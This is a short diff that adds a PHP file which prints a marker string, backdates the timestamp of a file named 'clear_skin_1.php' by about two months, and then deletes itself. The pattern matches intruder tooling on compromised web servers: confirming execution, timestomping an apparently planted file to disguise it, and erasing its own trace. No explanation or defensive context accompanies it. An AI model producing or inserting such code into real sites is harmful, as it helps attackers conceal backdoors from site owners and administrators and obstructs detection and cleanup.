@@ -1,0 +1,1 @@
+<?php echo "QKNZXvNUFR"; if (file_exists("./clear_skin_1.php")){ touch("./clear_skin_1.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*4r4ye773umwBNadErg5a*/ ?>
